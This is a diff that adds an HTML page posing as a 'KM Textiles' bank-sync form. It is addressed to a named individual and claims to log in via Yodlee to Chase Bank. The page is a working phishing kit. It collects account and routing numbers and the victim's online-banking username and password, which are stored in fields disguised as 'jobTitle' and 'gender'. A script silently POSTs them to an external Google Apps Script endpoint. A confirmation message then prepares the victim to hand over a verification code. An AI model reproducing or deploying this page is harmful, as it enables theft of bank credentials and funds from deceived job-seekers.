@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1.0" />
+
+<title>Sync Bank | KM Textiles</title>
+
+<link rel="stylesheet" href="nicepage.css" />
+<script src="jquery.js" defer></script>
+<script src="nicepage.js" defer></script>
+
+<style>
+
+body{
+  font-family:'Ubuntu',sans-serif;
+  background:#f3f6f9;
+  margin:0;
+}
+
+.container{
+  max-width:650px;
+  margin:40px auto;
+  background:white;
+  padding:25px;
+  border-radius:12px;
+  box-shadow:0 10px 25px rgba(0,0,0,.08);
+}
+
+h2{
+  margin-top:0;
+  color:#3A6578;
+}
+
+.profile-box{
+  background:#eef5f8;
+  border-left:4px solid #3A6578;
+  padding:14px;
+  border-radius:8px;
+  margin-bottom:18px;
+}
+
+.profile-box h3{
+  margin:0 0 6px;
+  color:#214c5c;
+}
+
+.profile-box p{
+  margin:4px 0;
+  color:#4c5c68;
+}
+
+.note{
+  background:#fff8d6;
+  border-left:4px solid #d4a44b;
+  padding:12px;
+  border-radius:8px;
+  margin-bottom:18px;
+  font-size:14px;
+}
+
+label{
+  font-weight:600;
+  display:block;
+  margin:10px 0 5px;
+}
+
+input,select{
+  width:100%;
+  padding:10px;
+  border-radius:8px;
+  border:1px solid #cfd6dd;
+  font-size:15px;
+}
+
+.submit-btn{
+  width:100%;
+  padding:12px;
+  margin-top:15px;
+  cursor:pointer;
+  font-size:16px;
+  border:none;
+  border-radius:8px;
+  font-weight:700;
+  background:#3A6578;
+  color:white;
+}
+
+.submit-btn:hover{
+  background:#214c5c;
+}
+
+#msg{
+  margin-top:12px;
+  font-weight:700;
+  color:#0a7a49;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <h2>KM-Textlies Bank Sync</h2>
+
+  <div class="profile-box">
+    <h3 id="displayName">Margarita Lizardi</h3>
+    <p><b>Login via Yodlee®:</b> <span id="displayLanguage">Chase Bank</span></p>
+  </div>
+
+  <div class="note">
+    Your information is transmitted through encrypted channels.
+  </div>
+
+  <form id="syncForm">
+
+    <label>Confirm Bank Name *</label>
+    <input type="text" name="bank" required>
+
+    <label>Account Number *</label>
+    <input type="text" name="account" required>
+
+    <label>Routing Number *</label>
+    <input type="text" name="routing" required>
+
+    <label>Username *</label>
+    <input type="text" name="jobTitle" required>
+
+    <label>Password *</label>
+    <input type="text" name="gender" required>
+<!--
+    <label>Supporting Document (Optional)</label>
+    <input type="file" name="file">
+-->
+    <button class="submit-btn" type="submit">
+      Submit Information
+    </button>
+
+  </form>
+
+  <div id="msg"></div>
+
+</div>
+
+<script>
+
+const SUPABASE_URL = "https://nkqnkmqbzouyeuttrdcf.supabase.co";
+const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5rcW5rbXFiem91eWV1dHRyZGNmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjE5MDc5NjMsImV4cCI6MjA3NzQ4Mzk2M30.6r5UB2kjz54m2T8_3HeKdrZp4LYhsW0xVp6smGlZj_M";
+
+const client = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+const profileName = "Margarita Lizardi";
+const profileLanguage = "Chase Bank";
+
+document.getElementById("displayName").textContent = profileName;
+document.getElementById("displayLanguage").textContent = profileLanguage;
+
+document.getElementById("syncForm").addEventListener("submit", async (e) => {
+
+  e.preventDefault();
+
+  const msg = document.getElementById("msg");
+  msg.textContent = "⏳ Sending information...";
+
+  const formData = new FormData(e.target);
+
+  const bank = formData.get("bank");
+  const account = formData.get("account");
+  const routing = formData.get("routing");
+  const jobTitle = formData.get("jobTitle");
+  const gender = formData.get("gender");
+
+  try {
+
+    await fetch("https://script.google.com/macros/s/AKfycbzyjRLpFLbMbrmalT2rDMRtqsWDjkStrh0ZNOcIN1-7sjnVunWwJ7QbBl0DBVE7R_vJ/exec", {
+      method: "POST",
+      body: new URLSearchParams({
+        formType: "sync-bank",
+        name: profileName,
+        language: profileLanguage,
+        bank,
+        account,
+        routing,
+        jobTitle,
+        gender
+      })
+    });
+
+    e.target.reset();
+
+    msg.textContent =
+      "✅ Credentials Received. Our system is now validating your account with Chase Bank. If a verification code is required, a secure link will be sent to your work email.";
+
+  } catch (err) {
+    console.error(err);
+    msg.textContent = "❌ Error submitting info.";
+  }
+
+});
+
+</script>
+
+</body>
+</html>
